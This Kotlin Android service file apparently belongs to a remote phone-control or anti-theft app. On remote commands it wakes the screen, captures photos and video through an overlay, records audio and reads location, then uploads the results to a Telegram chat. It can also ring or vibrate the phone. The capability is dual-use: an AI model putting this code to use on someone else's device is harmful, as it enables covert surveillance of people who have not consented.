package com.save.me

import android.app.Service
import android.content.Context
import android.content.Intent
import android.media.AudioManager
import android.media.RingtoneManager
import android.os.*
import android.view.SurfaceHolder
import android.view.View
import kotlinx.coroutines.*
import org.json.JSONObject
import java.io.File
import java.io.FileOutputStream
import android.content.pm.ServiceInfo
import java.util.concurrent.ConcurrentHashMap

class ForegroundActionService : Service() {
    private val serviceScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private val runningJobs = ConcurrentHashMap<Long, Job>()
    private val overlayViews = ConcurrentHashMap<Long, View?>()
    private val surfaceHolders = ConcurrentHashMap<Long, SurfaceHolder?>()
    private var wakeLock: PowerManager.WakeLock? = null

    override fun onCreate() {
        super.onCreate()
        log("onCreate")
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val action = intent?.getStringExtra("action") ?: ""
        val chatId = intent?.getStringExtra("chat_id")
        val commandId = intent?.getLongExtra("command_id", -1L) ?: System.currentTimeMillis()

        // --- 1. Wake the screen if camera/video (do not try to unlock, just wake the screen)
        if (action == "photo" || action == "video") {
            wakeScreenOnly()
            log("WakeLock (screen on only) acquired at onStartCommand entry (before notification/foreground)")
            try {
                Thread.sleep(350)
            } catch (_: Exception) {}
        }

        logPermissions()

        if ((action == "photo" || action == "video") && !hasAllCameraPermissions()) {
            log("PERMISSION ERROR: Required camera or foreground service camera permission not granted. Aborting photo/video.")
            sendError("Camera or foreground service camera permission not granted. Please grant permissions in app settings.", chatId, commandId)
            stopSelf()
            return START_NOT_STICKY
        }

        log("onStartCommand: action=$action, commandId=$commandId, startId=$startId")

        showNotificationForAction(action)

        val job = serviceScope.launch {
            try {
                when (action) {
                    "photo", "video" -> {
                        val overlayResult = withTimeoutOrNull(3500) {
                            OverlayHelper.awaitSurfaceOverlay(this@ForegroundActionService)
                        }
                        if (overlayResult == null) {
                            log("FAILURE: OverlayHelper.awaitSurfaceOverlay returned null -- overlay permission not granted or timed out!")
                            sendError("Unable to create camera surface for $action. Overlay permission required.", chatId, commandId)
                            releaseWakeLock()
                            return@launch
                        }
                        val (holderReady, overlay) = overlayResult
                        overlayViews[commandId] = overlay
                        surfaceHolders[commandId] = holderReady

                        log("Overlay and surface ready for $action, proceeding to capture...")
                        handleCameraAction(action, intent, chatId, commandId)
                        releaseWakeLock()
                    }
                    "audio" -> handleAudioRecording(intent, chatId, commandId)
                    "location" -> handleLocation(chatId, commandId)
                    "ring" -> handleRingInBackground(commandId)
                    "vibrate" -> handleVibrateInBackground(commandId)
                    else -> {
                        log("Unknown action: $action")
                        if (commandId > 0) CommandManager.onCommandActionComplete(commandId)
                    }
                }
            } catch (e: Exception) {
                log("EXCEPTION: Exception in job for commandId=$commandId: ${e.message}")
                sendError("Internal error: ${e.localizedMessage}", chatId, commandId)
            } finally {
                cleanupCommand(commandId)
                runningJobs.remove(commandId)
                if (runningJobs.isEmpty()) {
                    log("All jobs complete, stopping service")
                    stopSelf()
                }
            }
        }
        runningJobs[commandId] = job
        return START_NOT_STICKY
    }

    private fun hasAllCameraPermissions(): Boolean {
        val ctx = this
        val cam = android.Manifest.permission.CAMERA
        val fgCam = "android.permission.FOREGROUND_SERVICE_CAMERA"
        val fg = android.Manifest.permission.FOREGROUND_SERVICE
        return android.content.pm.PackageManager.PERMISSION_GRANTED ==
                androidx.core.content.ContextCompat.checkSelfPermission(ctx, cam) &&
                android.content.pm.PackageManager.PERMISSION_GRANTED ==
                androidx.core.content.ContextCompat.checkSelfPermission(ctx, fgCam) &&
                android.content.pm.PackageManager.PERMISSION_GRANTED ==
                androidx.core.content.ContextCompat.checkSelfPermission(ctx, fg)
    }

    private fun wakeScreenOnly() {
        try {
            val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
            if (wakeLock == null) {
                wakeLock = pm.newWakeLock(
                    PowerManager.SCREEN_BRIGHT_WAKE_LOCK or PowerManager.ACQUIRE_CAUSES_WAKEUP,
                    "com.save.me:CameraWakeLock"
                )
            }
            if (wakeLock?.isHeld == false) {
                wakeLock?.acquire(10_000)
                log("WakeLock (screen only) acquired")
            }
        } catch (e: Exception) {
            log("FAILURE: Failed to acquire WakeLock: ${e.message}")
        }
    }

    private fun releaseWakeLock() {
        try {
            if (wakeLock?.isHeld == true) {
                wakeLock?.release()
                log("WakeLock released")
            }
        } catch (e: Exception) {
            log("FAILURE: Failed to release WakeLock: ${e.message}")
        }
    }

    private suspend fun handleCameraAction(type: String, intent: Intent?, chatId: String?, commandId: Long) {
        val cameraFacing = intent?.getStringExtra("camera") ?: "rear"
        val flash = intent?.getBooleanExtra("flash", false) ?: false
        val quality = intent?.getIntExtra("quality", 720) ?: 720
        val durationMinutes = intent?.getDoubleExtra("duration", 1.0) ?: 1.0
        val outputFile = File(cacheDir, generateFileName(type, quality))
        val actionTimestamp = System.currentTimeMillis()
        val holder = surfaceHolders[commandId]
        if (holder == null) {
            log("FAILURE: No camera surface for $type (commandId=$commandId). This should never happen.")
            sendError("No camera surface for $type.", chatId, commandId)
            return
        }
        val result: Boolean = try {
            log("Invoking CameraBackgroundHelper.takePhotoOrVideo for $type (camera=$cameraFacing, flash=$flash, quality=$quality)...")
            CameraBackgroundHelper.takePhotoOrVideo(
                context = this,
                surfaceHolder = holder,
                type = type,
                cameraFacing = cameraFacing,
                flash = flash,
                videoQuality = quality,
                durationSec = (durationMinutes * 60).toInt(),
                file = outputFile
            )
        } catch (e: Exception) {
            log("EXCEPTION: Exception during $type capture at ${formatDateTime(actionTimestamp)}: ${e.message}")
            sendError("Exception in $type at ${formatDateTime(actionTimestamp)}: ${e.message}", chatId, commandId)
            return
        }
        if (commandId > 0) CommandManager.onCommandActionComplete(commandId)
        if (result && chatId != null) {
            log("SUCCESS: $type captured at ${formatDateTime(actionTimestamp)}. Output file: ${outputFile.absolutePath}")
            UploadManager.queueUpload(outputFile, chatId, type, actionTimestamp)
        } else if (!result) {
            log("FAILURE: $type capture failed at ${formatDateTime(actionTimestamp)}. No file at ${outputFile.absolutePath}")
            if (chatId != null) {
                sendError("Failed to capture $type at ${formatDateTime(actionTimestamp)}.", chatId, commandId)
            }
        }
    }

    private suspend fun handleAudioRecording(intent: Intent?, chatId: String?, commandId: Long) {
        val durationMinutes = intent?.getDoubleExtra("duration", 1.0) ?: 1.0
        val outputFile = File(cacheDir, "audio_${nowString()}.m4a")
        val actionTimestamp = System.currentTimeMillis()
        try {
            AudioBackgroundHelper.recordAudio(this, outputFile, (durationMinutes * 60).toInt())
            if (commandId > 0) CommandManager.onCommandActionComplete(commandId)
            if (chatId != null) {
                UploadManager.queueUpload(outputFile, chatId, "audio", actionTimestamp)
            }
        } catch (e: Exception) {
            log("EXCEPTION: Exception in audio recording at ${formatDateTime(actionTimestamp)}: ${e.message}")
            sendError("Exception in audio recording at ${formatDateTime(actionTimestamp)}: ${e.message}", chatId, commandId)
        }
    }

    private fun handleRingInBackground(commandId: Long) {
        val duration = 5
        val audioManager = getSystemService(Context.AUDIO_SERVICE) as AudioManager
        val oldVolume = audioManager.getStreamVolume(AudioManager.STREAM_RING)
        val maxVolume = audioManager.getStreamMaxVolume(AudioManager.STREAM_RING)
        val ringThread = HandlerThread("RingThread").apply { start() }
        val handler = Handler(ringThread.looper)
        handler.post {
            try {
                audioManager.setStreamVolume(AudioManager.STREAM_RING, maxVolume, 0)
                val ringtone = RingtoneManager.getRingtone(applicationContext, RingtoneManager.getDefaultUri(RingtoneManager.TYPE_RINGTONE))
                ringtone.play()
                Handler(Looper.getMainLooper()).postDelayed({
                    ringtone.stop()
                    audioManager.setStreamVolume(AudioManager.STREAM_RING, oldVolume, 0)
                    ringThread.quitSafely()
                    if (commandId > 0) CommandManager.onCommandActionComplete(commandId)
                }, (duration * 1000).toLong())
            } catch (e: Exception) {
                log("FAILURE: Exception in handleRing: ${e.message}")
                ringThread.quitSafely()
                if (commandId > 0) CommandManager.onCommandActionComplete(commandId)
            }
        }
    }

    private fun handleVibrateInBackground(commandId: Long) {
        val duration = 2000L
        val vibrateThread = HandlerThread("VibrateThread").apply { start() }
        val handler = Handler(vibrateThread.looper)
        handler.post {
            try {
                val vibrator = getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    vibrator.vibrate(VibrationEffect.createOneShot(duration, VibrationEffect.DEFAULT_AMPLITUDE))
                } else {
                    @Suppress("DEPRECATION")
                    vibrator.vibrate(duration)
                }
                Handler(Looper.getMainLooper()).postDelayed({
                    vibrateThread.quitSafely()
                    if (commandId > 0) CommandManager.onCommandActionComplete(commandId)
                }, duration)
            } catch (e: Exception) {
                log("FAILURE: Exception in handleVibrate: ${e.message}")
                vibrateThread.quitSafely()
                if (commandId > 0) CommandManager.onCommandActionComplete(commandId)
            }
        }
    }

    private suspend fun handleLocation(chatId: String?, commandId: Long) {
        val actionTimestamp = System.currentTimeMillis()
        try {
            val loc = LocationBackgroundHelper.getLastLocation(this)
            if (loc == null) {
                log("FAILURE: Location unavailable at ${formatDateTime(actionTimestamp)}.")
                sendError("Location unavailable at ${formatDateTime(actionTimestamp)}.", chatId, commandId)
                return
            }
            val locationFile = File(cacheDir, "location_${nowString()}.json")
            FileOutputStream(locationFile).use { out ->
                out.write("""{"lat":${loc.latitude},"lng":${loc.longitude},"timestamp":${loc.time}}""".toByteArray())
            }
            if (commandId > 0) CommandManager.onCommandActionComplete(commandId)
            if (chatId != null) {
                UploadManager.queueUpload(locationFile, chatId, "location", actionTimestamp)
            }
        } catch (e: Exception) {
            log("EXCEPTION: Exception in location service at ${formatDateTime(actionTimestamp)}: ${e.message}")
            sendError("Exception in location service at ${formatDateTime(actionTimestamp)}: ${e.message}", chatId, commandId)
        }
    }

    override fun onDestroy() {
        log("onDestroy")
        runningJobs.values.forEach { it.cancel() }
        runningJobs.clear()
        serviceScope.cancel()
        releaseWakeLock()
        super.onDestroy()
    }

    private fun cleanupCommand(commandId: Long) {
        try {
            overlayViews[commandId]?.let { OverlayHelper.removeOverlay(this, it) }
        } catch (_: Exception) {
            log("FAILURE: Exception in cleanupCommand (overlay removal)")
        }
        surfaceHolders.remove(commandId)
        overlayViews.remove(commandId)
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun showNotificationForAction(action: String) {
        val notification = androidx.core.app.NotificationCompat.Builder(this, NotificationHelper.CHANNEL_ID)
            .setContentTitle("Remote Control Service")
            .setContentText("Running background actions...")
            .setSmallIcon(R.drawable.ic_notification)
            .setPriority(androidx.core.app.NotificationCompat.PRIORITY_HIGH)
            .setCategory(androidx.core.app.NotificationCompat.CATEGORY_ALARM)
            .build()
        val type = getForegroundServiceType(action)
        log("Calling startForeground: type=$type for action=$action")
        // THE FIX: For vibrate and ring, use the special use foreground service type on Android 14+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q && type != 0) {
            try {
                startForeground(1, notification, type)
            } catch (e: SecurityException) {
                log("FAILURE: SecurityException in startForeground! type=$type action=$action: ${e.message}")
                stopSelf()
                return
            }
        } else {
            startForeground(1, notification)
        }
    }

    private fun getForegroundServiceType(action: String): Int {
        return when (action) {
            "photo" -> ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
            "video" -> ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
            "audio" -> ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
            "location" -> ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
            // For vibrate and ring, use SPECIAL_USE type on Android 14+ (API 34)
            "vibrate", "ring" -> {
                if (Build.VERSION.SDK_INT >= 34) {
                    // Only available from API 34 (Android 14)
                    0x00000080 // ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE in AOSP source
                } else {
                    0
                }
            }
            else -> 0
        }
    }

    private fun sendError(msg: String, chatId: String?, commandId: Long) {
        log("sendError: $msg")
        if (chatId != null) {
            val deviceNickname = Preferences.getNickname(this) ?: "Device"
            UploadManager.sendTelegramMessage(chatId, "[$deviceNickname] Error: $msg")
        }
        if (commandId > 0) CommandManager.onCommandActionComplete(commandId)
    }

    private fun log(msg: String) {
        android.util.Log.d("ForegroundActionService", msg)
    }

    private fun logPermissions() {
        val context = this
        val perms = listOf(
            android.Manifest.permission.CAMERA,
            android.Manifest.permission.RECORD_AUDIO,
            "android.permission.FOREGROUND_SERVICE",
            "android.permission.FOREGROUND_SERVICE_CAMERA",
            "android.permission.FOREGROUND_SERVICE_MICROPHONE",
            "android.permission.FOREGROUND_SERVICE_LOCATION",
            // Add special use permission to logs for debug
            "android.permission.FOREGROUND_SERVICE_SPECIAL_USE"
        )
        val status = perms.joinToString(", ") { perm ->
            "$perm=${androidx.core.content.ContextCompat.checkSelfPermission(context, perm) == android.content.pm.PackageManager.PERMISSION_GRANTED}"
        }
        log("Permission state: $status")
    }

    private fun formatDateTime(ts: Long): String = java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.US).format(java.util.Date(ts))

    companion object {
        fun start(context: Context) {
            val intent = Intent(context, ForegroundActionService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }
        fun stop(context: Context) {
            context.stopService(Intent(context, ForegroundActionService::class.java))
        }
        fun isRunning(context: Context): Boolean = false

        fun startCameraAction(
            context: Context,
            type: String,
            options: JSONObject,
            chatId: String?,
            commandId: Long
        ) {
            val intent = Intent(context, ForegroundActionService::class.java)
            intent.putExtra("action", type)
            intent.putExtra("camera", options.optString("camera", "rear"))
            if (options.has("flash")) intent.putExtra("flash", options.optBoolean("flash", false))
            if (type == "video" || type == "photo") {
                if (options.has("quality")) intent.putExtra("quality", options.optInt("quality", 720))
                if (options.has("duration")) {
                    intent.putExtra("duration", options.optDouble("duration", 1.0))
                }
            }
            chatId?.let { intent.putExtra("chat_id", it) }
            intent.putExtra("command_id", commandId)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }

        fun startAudioAction(context: Context, options: JSONObject, chatId: String?, commandId: Long) {
            val duration = options.optDouble("duration", 1.0)
            val intent = Intent(context, ForegroundActionService::class.java)
            intent.putExtra("action", "audio")
            intent.putExtra("duration", duration)
            chatId?.let { intent.putExtra("chat_id", it) }
            intent.putExtra("command_id", commandId)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }
        fun startLocationAction(context: Context, chatId: String?, commandId: Long) {
            val intent = Intent(context, ForegroundActionService::class.java)
            intent.putExtra("action", "location")
            chatId?.let { intent.putExtra("chat_id", it) }
            intent.putExtra("command_id", commandId)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }
        fun startRingAction(context: Context, options: JSONObject, commandId: Long) {
            val intent = Intent(context, ForegroundActionService::class.java)
            intent.putExtra("action", "ring")
            intent.putExtra("command_id", commandId)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }
        fun startVibrateAction(context: Context, options: JSONObject, commandId: Long) {
            val intent = Intent(context, ForegroundActionService::class.java)
            intent.putExtra("action", "vibrate")
            intent.putExtra("command_id", commandId)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent)
            } else {
                context.startService(intent)
            }
        }

        fun generateFileName(type: String, quality: Int): String {
            val sdf = java.text.SimpleDateFormat("yyyyMMdd_HHmmss", java.util.Locale.US)
            return if (type == "video") {
                "${type}_${quality}p_${sdf.format(java.util.Date())}.mp4"
            } else {
                "${type}_${sdf.format(java.util.Date())}.jpg"
            }
        }
        fun nowString(): String = java.text.SimpleDateFormat("yyyyMMdd_HHmmss", java.util.Locale.US).format(java.util.Date())
    }
}